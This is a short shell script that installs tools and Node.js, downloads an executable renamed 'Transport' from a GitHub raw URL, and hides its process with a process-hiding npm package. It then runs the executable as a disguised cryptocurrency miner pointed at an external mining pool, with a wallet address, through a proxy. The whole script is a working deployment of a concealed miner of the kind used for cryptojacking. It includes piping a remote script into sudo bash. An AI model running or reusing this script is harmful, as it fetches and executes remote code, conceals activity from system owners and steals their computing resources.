apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 30
sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 140.238.243.1:1080 --dns-https-server 1.1.1.1
